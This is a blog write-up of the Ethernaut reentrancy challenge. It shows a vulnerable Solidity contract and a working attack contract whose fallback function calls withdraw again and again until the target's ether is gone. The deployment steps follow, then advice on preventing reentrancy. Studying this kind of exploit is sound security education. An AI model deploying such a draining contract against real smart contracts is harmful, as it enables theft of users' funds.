<!doctype html><html lang=en><head><title>Reeintrancy - Ethernaut :: Dimitris Vagiakakos SV1SJP</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="On this challenge, we will learn how the infamous DAO occured and how to prevent such an incident to occur again. Ethereum splitted into two Blockchains, Ethereum and Ethereum Classic because of a DAO Attack. So we have this smart-contract and we have to withdraw all of it&amp;rsquo;s ether:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract Reentrance { using SafeMath for uint256; mapping(address =&amp;gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to]."><meta name=keywords content="decentralized"><meta name=robots content="noodp"><link rel=canonical href=/blockchain_writeups/reeinctancy/><link rel=stylesheet href=/styles.css><link rel="shortcut icon" href=/favicon.ico><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Reeintrancy - Ethernaut"><meta property="og:description" content="On this challenge, we will learn how the infamous DAO occured and how to prevent such an incident to occur again. Ethereum splitted into two Blockchains, Ethereum and Ethereum Classic because of a DAO Attack. So we have this smart-contract and we have to withdraw all of it&amp;rsquo;s ether:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract Reentrance { using SafeMath for uint256; mapping(address =&amp;gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to]."><meta property="og:url" content="/blockchain_writeups/reeinctancy/"><meta property="og:site_name" content="Dimitris Vagiakakos SV1SJP"><meta property="og:image" content="/favicon.ico"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2022-02-01 00:00:00 +0000 UTC"></head><body class=lime><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Dimitris Vagiakakos SV1SJP</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;â–¾</li><li><ul class=menu__dropdown><li><a href=/whoami>$whoami</a></li><li><a href=/about>About TuxHouse</a></li><li><a href=/blockchain_camera>Blockchain Camera</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/greek_articles>Greek Articles</a></li><li><a href=https://fosstodon.org/@sv1sjp>micro-blogging</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/ubuntel>Ubuntel</a></li><li><a href=https://odysee.com/@TuxHouse:1>Videos</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/whoami>$whoami</a></li><li><a href=/about>About TuxHouse</a></li><li><a href=/blockchain_camera>Blockchain Camera</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/greek_articles>Greek Articles</a></li><li><a href=https://fosstodon.org/@sv1sjp>micro-blogging</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/ubuntel>Ubuntel</a></li><li><a href=https://odysee.com/@TuxHouse:1>Videos</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=/blockchain_writeups/reeinctancy/>Reeintrancy - Ethernaut</a></h1><div class=post-meta><time class=post-date>2022-02-01</time><span class=post-author>Dimitris Vagiakakos && Stavros Gkinos</span><span class=post-reading-time>3 min read (543 words)</span></div><div class=post-content><div><p>On this challenge, we will learn how the infamous DAO occured and how to prevent such an incident to occur again. Ethereum splitted into two Blockchains, Ethereum and Ethereum Classic because of a DAO Attack.
So we have this smart-contract and we have to withdraw all of it&rsquo;s ether:</p><pre tabindex=0><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;;

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address =&gt; uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] &gt;= _amount) {
      (bool result,) = msg.sender.call{value:_amount}(&#34;&#34;);
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
</code></pre><p>Re-entrancy happens in single-thread computing environments, when the execution stack jumps or calls subroutines, before returning to the original execution.
Firstly, we create a smart-contract called ReentranceAttack.sol with which we are going to attack the main smart-contract shown above:</p><pre tabindex=0><code>// SPDX-License-Identifier: MIT

pragma solidity ^0.6.10;

import &#39;./Reentrance.sol&#39;;

contract ReentranceAttack {

  Reentrance target;
  uint public amount = 1 ether;

  constructor(address payable _targetAddr) public payable {
    target= Reentrance(_targetAddr);
  }

  function donateToTarget() public {
    target.donate.value(amount).gas(4000000)(address(this));   }

  fallback() external payable {
    if (address(target).balance !=0){
      target.withdraw(amount);
    }
  }
}
</code></pre><p>We need to take into account these two criterias:</p><ul><li>Fallback functions can be called by anyone and execute malicious code.</li><li>Malicious external contracts can abuse withdrawals.</li></ul><p>The expoitation was done by following these steps:</p><ul><li>We deploy ReentranceAttack.sol with a value of 1 ether and as an address parameter we input the Reentrance.sol address which we find from the console by typing &ldquo;contract.address&rdquo;.</li><li>We donate 1 ether to the Reentrance.sol by calling the function donateToTarget() from the ReentranceAttack.sol in order to add ReentranceAttack.sol address into balances.</li></ul><pre tabindex=0><code>mapping(address =&gt; uint) public balances;
</code></pre><p>Now that we are into balances, we satisfy the requirement of withdraw() function.</p><ul><li>By using the Remix IDE, we trigger the fallback() function from the ReentranceAttack.sol which calls the withdraw() function from the Reentrance.sol. Now the withdraw() function is called and we satisfy the requirement of it, it will call back the fallback() function of the ReentranceAttack.sol and this loop will continue until the balance of the Reentrance.sol is zero.</li><li></li></ul><p>There are multiple ways to protect your smart-contract in order to prevent issues like DAO Attack to happen.</p><ul><li>The order of execution really matters in programming, specially in Solidity. If we have to take external function calls, making the call must be the last thing to do. Even better,if we can invoke transfer in a separate function.</li><li>Include a mutex to prevent re-entrancy. For example we can create a Boolean lock variable or a binary variable to signal execution depth.</li><li>When we have to use function modifiers to check invariants, we should be extremely careful as modifiers are executed at the start of the function.</li><li>Use transfer to move funds out of a smart-contract, as low level functions like call and send just return false but don&rsquo;t interrupt the execution flow when receiving contract fails.</li></ul><hr><p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:</p><h2 id=smart-contract-security>Smart-Contract Security:<a href=#smart-contract-security class=hanchor arialabel=Anchor>&#8983;</a></h2><ul><li><p><a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here</a></p></li><li><p><a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here</a></p></li></ul></div></div></article></div><footer class=footer><a rel=me href=https://fosstodon.org/@sv1sjp></a><div class=footer__inner><div class="copyright copyright--user"><span>All rights reserved, TuxHouse Educational Technologies - Dimitris LinuxOS - 2011-2023</span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>